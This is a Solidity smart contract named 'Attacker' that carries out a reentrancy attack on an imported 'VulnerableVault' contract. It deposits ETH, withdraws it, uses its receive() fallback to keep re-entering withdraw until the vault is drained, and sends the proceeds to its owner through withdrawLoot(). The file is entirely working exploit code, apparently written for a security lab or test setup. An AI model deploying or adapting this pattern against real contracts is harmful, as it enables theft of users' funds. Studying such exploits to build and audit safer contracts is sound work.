// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public immutable target;
    uint256 public attackAmount;
    address public immutable owner;

    constructor(address target_) {
        target = VulnerableVault(target_);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "not owner");
        require(msg.value > 0, "send eth");
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }

    function withdrawLoot() external {
        require(msg.sender == owner, "not owner");
        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
        require(ok, "withdraw failed");
    }
}
